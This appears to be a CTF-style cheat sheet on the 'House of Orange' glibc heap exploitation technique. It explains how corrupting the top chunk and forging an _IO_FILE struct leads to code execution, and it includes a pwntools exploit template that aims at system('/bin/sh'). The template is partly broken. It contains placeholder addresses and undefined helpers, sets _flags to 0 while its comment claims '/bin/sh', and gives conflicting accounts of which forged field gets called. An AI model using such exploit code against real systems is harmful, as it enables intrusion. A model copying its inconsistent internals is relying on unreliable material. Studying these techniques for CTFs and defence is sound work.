# House of Orange

**When**: No `free()` available. Can overflow the top chunk's size field. glibc < 2.24 for original FSOP; 2.24+ needs vtable bypass.
**Primitive needed**: Heap overflow into top chunk header.
**Result**: Code execution via FSOP (File Stream Oriented Programming).

## Mechanism
1. Corrupt top chunk size to a small value (must pass alignment/sanity checks).
2. Request a large allocation → `sysmalloc` sees the top chunk is too small → frees the old top chunk into the unsorted bin.
3. Now you have a freed chunk without ever calling `free()`.
4. Abuse the unsorted bin chunk via FSOP: forge an `_IO_FILE` struct that, when flushed, calls `system("/bin/sh")`.

## PoC
```python
# IN: heap overflow into top chunk
# OUT: code execution via FSOP
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('./libc.so.6')
p = process('./binary')

# Step 1: Corrupt top chunk size
# Must satisfy: size aligned to page, > MINSIZE, PREV_IN_USE set
# Example: if top is at 0x...020, page ends at 0x...000
# new_size = page_end - top_addr - header | PREV_IN_USE
top_addr = heap_base + 0x...  # from heap leak
new_size = (page_align(top_addr) - top_addr) | 1
alloc(0, 0x18, b'A'*0x18 + p64(new_size))

# Step 2: Large alloc triggers sysmalloc → old top goes to unsorted bin
alloc(1, 0x1000)

# Step 3: Forge _IO_FILE struct in the unsorted bin chunk
# (via partial overwrite or second overflow)
fake_file = flat(
    0,                       # _flags: "/bin/sh\x00" (doubles as command)
    0, 0, 0, 0,              # _IO_read_*
    0, 0, 0,                 # _IO_write_base, _IO_write_ptr
    p64(libc.sym['system']), # _IO_write_end → called as function pointer
    # ... remaining fields ...
)

# Step 4: Trigger FSOP — exit() flushes all IO streams
# The forged _IO_FILE's vtable __overflow calls system("/bin/sh")
p.interactive()
```

## glibc Version Notes
| Version | Constraint |
|---|---|
| < 2.24 | Original FSOP works — direct vtable overwrite |
| 2.24+ | Vtable must be in `__libc_IO_vtables` — use `_IO_str_overflow` path |
| 2.34+ | Hooks removed — use House of Apple 2 (`_IO_wfile_overflow`) instead |

## Trap
- Top chunk size constraints: `(size & 0xFFF) == 0` (page aligned), `size > MINSIZE`, `PREV_IN_USE` bit set, `top + size == page boundary`.
- The unsorted bin chunk overlaps the old top — you need to control its contents after `sysmalloc`.
